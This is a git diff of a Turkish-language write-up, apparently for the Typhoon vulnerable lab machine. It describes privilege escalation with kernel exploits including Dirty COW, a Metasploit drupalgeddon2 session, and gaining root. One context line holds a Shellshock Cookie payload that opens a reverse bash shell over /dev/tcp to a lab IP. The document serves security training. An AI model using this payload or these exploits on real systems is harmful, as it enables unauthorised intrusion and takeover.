@@ -26,9 +26,9 @@ uname -a komutu ile sistem bilgilerini çektim ve biraz araştırma yaptığımd
 
 ![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/sshuname.png)
 
-Bulduğum exploit’i kendi makinemden hedef makineye wget yardımıyla çekerek gcc ile derleyip çalıştırdım.
+Bulduğum exploit’i kendi makinemden hedef makineye wget yardımıyla çekerek gcc ile derleyip çalıştırdım ve root yetkisini elde ettim.
 
-![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/sshexploit.png)
+![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/ssshexploit.png)
 
 # HTTP
 
@@ -68,7 +68,7 @@ Cookie:() { :;}; echo; /bin/bash -i >& /dev/tcp/192.168.44.128/5555 0>&1
 
 ![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/7.png)
 
-ssh'da kullandığım exploit çalışmadı biraz araştırmayla "Dirty COW" adlı başka bir exploit buldum. Exploit'i kendi makineme indirip derlerken hata aldım fakat kullanılabilir durumdaydı bu yüzden hedef makineye çektim.
+ssh'da kullandığım exploit çalışmadı biraz araştırmayla "Dirty COW" adlı başka bir exploit buldum. Exploit'i kendi makineme indirip derlerken hata aldım fakat kullanılabilir durumdaydı bu yüzden hedef makineye çektim. https://www.exploit-db.com/exploits/40616
 
 ![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/shellshockgcc.png)
 
@@ -114,7 +114,7 @@ drupal dizinine gidip sayfanın kaynağını görüntülediğimde drupal ın dru
 
 ![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/17.png)
 
-Metasploit Framework de drupal 8 için görünen exploitleri denemeye başladım ve drupal_drupalgeddon2 isimli exploit ile meterpreter session'ını aldım. Daha önce kullandığım exploit burda da işe yaradı ve root yetkisini elde ettim.
+Metasploit Framework de drupal 8 için görünen exploitleri denemeye başladım ve drupal_drupalgeddon2 isimli exploit ile meterpreter session'ı aldım. Daha önce kullandığım exploit burda da işe yaradı ve root yetkisini elde ettim.
 
 ![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/drupalexploityeni.png)
 
